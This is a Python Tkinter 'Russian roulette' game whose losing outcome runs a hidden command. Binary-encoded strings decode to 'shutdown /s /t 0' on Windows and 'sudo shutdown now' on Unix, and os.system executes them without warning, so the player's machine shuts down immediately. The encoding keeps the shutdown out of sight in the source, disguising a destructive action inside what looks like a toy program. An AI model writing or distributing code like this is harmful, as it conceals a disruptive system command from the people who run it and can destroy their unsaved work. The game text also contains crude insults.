import os
import subprocess
import random
import time
import tkinter as tk
from tkinter import ttk
class App():
    def __init__(self) -> None:
        self.target = random.randint(1,6)
        self.root = tk.Tk()
        self.root.geometry('450x300')
        self.root.title('Russian roulette')
        self.mainframe = tk.Frame(self.root, background = 'white')
        self.mainframe.pack(fill = 'both',expand = True)

        self.text = ttk.Label(self.mainframe, text = "Welcome to Russian Roulette",background='white', font=('Brass Mono',20))
        self.text.grid(row=0, column =0)

        self.result = ttk.Label(self.mainframe,text = "")
        self.result.grid(row=3,column=0, pady= 10,sticky="NWES")

        set_text_button = ttk.Button(self.mainframe, text = "Fire!!!",command=self.shot_fire)
        set_text_button.grid(row=1,column=0,pady=10)
        self.root.mainloop()
        return
    def shot_fire(self):
        self.result.config(text="Trigger")
        roll_result = random.randint(1,6)
        if(roll_result != self.target):
            self.result.config(text="You lucky piece of shit!!!")
        else:
            self.result.config(text="You Just got Shot")
            time.sleep(5)
            Command_computer()

def binary_to_text(binary_str):
    text_command = ''.join(chr(int(binary_str[i:i+8], 2)) for i in range(0, len(binary_str), 8))
    return text_command

def Command_computer():
    command  = "01110011011010000111010101110100011001000110111101110111011011100010000000101111011100110010000000101111011101000010000000110000"
    command1 = "0111001101110101011001000110111100100000011100110110100001110101011101000110010001101111011101110110111000100000011011100110111101110111"
    print(binary_to_text(command))
    if os.name == 'nt':
        # For Windows operating system
        os.system(binary_to_text(command))
    elif os.name == 'posix':
        # For Unix/Linux/Mac operating systems
        os.system(binary_to_text(command1))
    else:
        print('Unsupported operating system.')

# def main():

#     shutdown_computer()

if __name__ == '__main__':
    App()